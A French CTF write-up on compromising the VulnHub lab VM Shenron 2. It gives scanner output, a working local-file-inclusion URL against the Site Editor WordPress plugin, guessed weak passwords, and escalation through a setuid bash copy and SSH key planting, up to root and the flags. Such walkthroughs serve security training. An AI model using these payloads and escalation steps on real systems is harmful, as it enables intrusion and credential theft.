# Solution du CTF Shenron 2 de VulnHub

Le précédent de la série était pas mal alors j'ai continué sur ce [shenron: 2 de VulnHub](https://vulnhub.com/entry/shenron-2,677/).

```
Nmap scan report for 192.168.56.61
Host is up (0.00015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4a476b4648c5d78f30925b0c2ba474ae (RSA)
|   256 b04ed64cc24e1505c4211d697df2dc79 (ECDSA)
|_  256 1bc0667a65689b358c63d3b9d25bf01c (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Highlights by HTML5 UP
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: shenron-2 &#8211; Just another WordPress site
|_http-generator: WordPress 5.7
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Une énumération sur le port 80 ne ressort rien d'intéressant. Sur le port 8080 on trouve en revanche un Wordpress configuré pour le nom d'hôte `shenron`.

## I went for a LFI...

Je lance WPscan dessus :

```shellsession
$ docker run --add-host shenron:192.168.56.61 -it --rm wpscanteam/wpscan --url http://shenron:8080/ -e ap,at,cb,dbe --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://shenron:8080/ [192.168.56.61]
[+] Started: Thu Nov 17 19:23:00 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://shenron:8080/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://shenron:8080/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://shenron:8080/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://shenron:8080/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7 identified (Insecure, released on 2021-03-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://shenron:8080/index.php/feed/, <generator>https://wordpress.org/?v=5.7</generator>
 |  - http://shenron:8080/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.7</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://shenron:8080/wp-content/themes/twentynineteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://shenron:8080/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://shenron:8080/wp-content/themes/twentynineteen/style.css?ver=2.0
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://shenron:8080/wp-content/themes/twentynineteen/style.css?ver=2.0, Match: 'Version: 2.0'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:02:36 <============================================================================================================================> (101154 / 101154) 100.00% Time: 00:02:36
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://shenron:8080/wp-content/plugins/akismet/
 | Last Updated: 2022-11-08T05:36:00.000Z
 | Readme: http://shenron:8080/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.0.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://shenron:8080/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.1.9 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://shenron:8080/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://shenron:8080/wp-content/plugins/akismet/readme.txt

[+] classic-editor
 | Location: http://shenron:8080/wp-content/plugins/classic-editor/
 | Last Updated: 2022-11-04T19:15:00.000Z
 | Readme: http://shenron:8080/wp-content/plugins/classic-editor/readme.txt
 | [!] The version is out of date, the latest version is 1.6.2
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://shenron:8080/wp-content/plugins/classic-editor/, status: 200
 |
 | Version: 1.6 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://shenron:8080/wp-content/plugins/classic-editor/readme.txt

[+] elementor
 | Location: http://shenron:8080/wp-content/plugins/elementor/
 | Last Updated: 2022-11-13T14:00:00.000Z
 | Readme: http://shenron:8080/wp-content/plugins/elementor/readme.txt
 | [!] The version is out of date, the latest version is 3.8.1
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://shenron:8080/wp-content/plugins/elementor/, status: 200
 |
 | Version: 3.1.4 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://shenron:8080/wp-content/plugins/elementor/readme.txt
 | Confirmed By: Javascript Comment (Aggressive Detection)
 |  - http://shenron:8080/wp-content/plugins/elementor/assets/js/admin-feedback.js, Match: 'elementor - v3.1.4'

[+] site-editor
 | Location: http://shenron:8080/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 | Readme: http://shenron:8080/wp-content/plugins/site-editor/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://shenron:8080/wp-content/plugins/site-editor/, status: 200
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://shenron:8080/wp-content/plugins/site-editor/readme.txt

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:37 <==============================================================================================================================> (24905 / 24905) 100.00% Time: 00:00:37
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentynineteen
 | Location: http://shenron:8080/wp-content/themes/twentynineteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://shenron:8080/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://shenron:8080/wp-content/themes/twentynineteen/style.css
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://shenron:8080/wp-content/themes/twentynineteen/, status: 500
 |
 | Version: 2.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://shenron:8080/wp-content/themes/twentynineteen/style.css, Match: 'Version: 2.0'

[+] twentytwenty
 | Location: http://shenron:8080/wp-content/themes/twentytwenty/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://shenron:8080/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.1
 | Style URL: http://shenron:8080/wp-content/themes/twentytwenty/style.css
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://shenron:8080/wp-content/themes/twentytwenty/, status: 500
 |
 | Version: 1.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://shenron:8080/wp-content/themes/twentytwenty/style.css, Match: 'Version: 1.7'

[+] twentytwentyone
 | Location: http://shenron:8080/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://shenron:8080/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://shenron:8080/wp-content/themes/twentytwentyone/style.css
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://shenron:8080/wp-content/themes/twentytwentyone/, status: 500
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://shenron:8080/wp-content/themes/twentytwentyone/style.css, Match: 'Version: 1.2'

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <=========================================================================================================================================> (71 / 71) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Nov 17 19:26:46 2022
[+] Requests Done: 126335
[+] Cached Requests: 24
[+] Data Sent: 33.678 MB
[+] Data Received: 34.107 MB
[+] Memory used: 512.668 MB
[+] Elapsed time: 00:03:46
```

Deux des plugins trouvent leur correspondance sur exploit-db :

* [WordPress Plugin Elementor 3.6.2 - Remote Code Execution (RCE) (Authenticated) - PHP webapps Exploit](https://www.exploit-db.com/exploits/50882)

* [WordPress Plugin Site Editor 1.1.1 - Local File Inclusion - PHP webapps Exploit](https://www.exploit-db.com/exploits/44340)

Vu que l'on ne dispose pas d'identifiants pour le Wordpress, la seconde vulnérabilité est celle à tester. Il s'agit vraiment d'une faille d'inclusion toute bête.

J'arrive à dumper `/etc/passwd` avec l'URL suivante :

`http://192.168.56.61:8080/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd`

On retrouve les deux même utilisateurs quand dans l'épisode précédent :

```
shenron:x:1000:1000:shenron,,,:/home/shenron:/bin/bash
jenny:x:1001:1001::/home/jenny:/bin/bash
```

J'aimerais bien transformer cette LFI en RCE mais toutes les tentatives ont échouée :

* message d'erreur étrange quand on tente d'utiliser les filtres PHP : `didn't load shortcodes pattern file`

* inclusions distantes qui n'aboutissent pas (tentative de bruteforcer les ports egress pour les protos http et ftp sans succès)

* inclusion de ficjiers de logs en erreur

* erreur aussi sur `/proc/self/environ` ou `/proc/self/fd/X`

## ... and all I got was a lousy password

Bref de quoi désespérer. Finalement il s'est avéré que cette chère `jenny` a le mot de passe... `jenny`.

Comme SSH est en écoute je récupère un shell et remarque que l'utilsateur `shenron` fait partie du groupe `sudo`. Il était de tout façon probable qu'il soit une étape du CTF.

Je ne trouve pas de fichiers particuliers pour `shenron` (qui seraient par exemple en dehors de son dossier personnel) mais quand je recherche le fichier de configuration de Wordpress sur le système je m'apperçoit qu'il est dans son home (`/home/shenron/wordpress/wp-config.php`)

```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'WordPressDB' );

/** MySQL database username */
define( 'DB_USER', 'user' );

/** MySQL database password */
define( 'DB_PASSWORD', 'User@123' );
```

Password reuse ? Non, `su` me refuse le mot de passe. Je fouille donc dans la DB :

```sql
mysql> select user_login, user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BHcDMQ33CZxfUoxktkBT/4G5va09AT. |
+------------+------------------------------------+
1 row in set (0.00 sec)
```

Je passe le hash à JtR qui m'indique que le mot de passe est... `admin`.

Incroyable, j'ai pourtant tenté une attaque brute-force sur le xmlrpc du Wordpress avec `WPscan` et il n'a rien détecté.

A la recherche des binaires setuid, j'en trouve un original :

`-rwsr-xr-x 1 root root 16712 Apr  6  2021 /usr/bin/Execute`

La commande `strings` n'est pas présente sur le système mais `hexdump` est présent. Je peux me faire une idée du fonctionnement du programme :

```
00002000  01 00 02 00 00 00 00 00  2f 75 73 72 2f 62 69 6e  |......../usr/bin|
00002010  2f 63 70 20 2f 62 69 6e  2f 62 61 73 68 20 2f 6d  |/cp /bin/bash /m|
00002020  6e 74 2f 62 61 73 68 3b  20 2f 75 73 72 2f 62 69  |nt/bash; /usr/bi|
00002030  6e 2f 63 68 6d 6f 64 20  37 37 37 20 2f 6d 6e 74  |n/chmod 777 /mnt|
00002040  2f 62 61 73 68 3b 20 2f  75 73 72 2f 62 69 6e 2f  |/bash; /usr/bin/|
00002050  63 68 6f 77 6e 20 73 68  65 6e 72 6f 6e 3a 73 68  |chown shenron:sh|
00002060  65 6e 72 6f 6e 20 2f 6d  6e 74 2f 62 61 73 68 3b  |enron /mnt/bash;|
00002070  20 2f 75 73 72 2f 62 69  6e 2f 63 68 6d 6f 64 20  | /usr/bin/chmod |
00002080  75 2b 73 20 2f 6d 6e 74  2f 62 61 73 68 00 00 00  |u+s /mnt/bash...|
```

Après exécution je trouve effetctivement un binaire setuid `shenron` dans `/mnt` :

`-rwsrwxrwx  1 shenron shenron 1183448 Nov 18 03:27 bash`

On l'exécute avec l'option `-p` pour éviter que bash ne drop l'effective uid.

```shellsession
bash-5.0$ id
uid=1001(jenny) gid=1001(jenny) euid=1000(shenron) groups=1001(jenny)
```

On peut accéder au flag :

```shellsession
bash-5.0$ cat Desktop/local.txt 
40252f8ffc3932fd2b5ae4995defb92
```

Du fait que seul l'effective uid correspond à `shenron`, on ne peut pas effectuer certaines opérations :

```shellsession
bash-5.0$ sudo su
[sudo] password for jenny:
```

De même si on veut jouer sur la crontab de shenron :

```shellsession
bash-5.0$ crontab -l
no crontab for jenny
```

On peut tout de même créer le dossier `.ssh` et rajouter notre clé publique dans `authorized_keys`. En s'assurant que les permissions sur le groupe + tout le mode soit retirées on peut alors se connecter en SSH et avoir la vrai identité `shenron`.

Malheureusement `sudo -l` nécessite le mot de passe que l'on ne connait pas. L'utilisateur fait partie de différents groupes :

`uid=1000(shenron) gid=1000(shenron) groups=1000(shenron),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)`

Mais comme vu précédemment on ne peut pas utiliser sudo et les exécutables liés à lxd sont absents.

Les pribilèves du groupe adm permettent de lire les logs, notamment ceux d'authentification mais aucun mot de passe n'a fuité dedans.

Ca m'a traversé l'esprit de tenter une race condition sur le binaire `Execute` vu plus tôt mais le dossier contenant l'exécutable n'est pas writable donc on ne peut pas supprimer le fichier, quand bien même on en est propriétaire.

## DIDNTSEELOL

Finalement j'ai découvert un fichier caché `.pass` qui était aussi dans le dossier `Desktop`. Il semble contenir des données encodées.

```shellsession
$ echo KNUEK3SSN5HFG2CFNZJG6TSTNBCW4UTPJZJWQRLOKJXU4U3IIVXFE32OIBJWQRLOKJXU4I2TNBCW4UTPJZIGCU3TK5XVEZAK | base32 -d
ShEnRoNShEnRoNShEnRoNShEnRoNShEnRoN@ShEnRoN#ShEnRoNPaSsWoRd
```

C'était du base32 et avec cette longue chaine on peut finalement faire un sudo su et passer root.

```shellsession
root@shenron-2:~# cat root.txt 
                                                               
  mmmm  #                                                 mmmm 
 #"   " # mm    mmm   m mm    m mm   mmm   m mm          "   "#
 "#mmm  #"  #  #"  #  #"  #   #"  " #" "#  #"  #             m"
     "# #   #  #""""  #   #   #     #   #  #   #   """     m"  
 "mmm#" #   #  "#mm"  #   #   #     "#m#"  #   #         m#mmmm
                                                               
Your Root Flag Is Here :- a89604e285437f789ff278d2239aea02
```

*Publié le 18 novembre 2022*
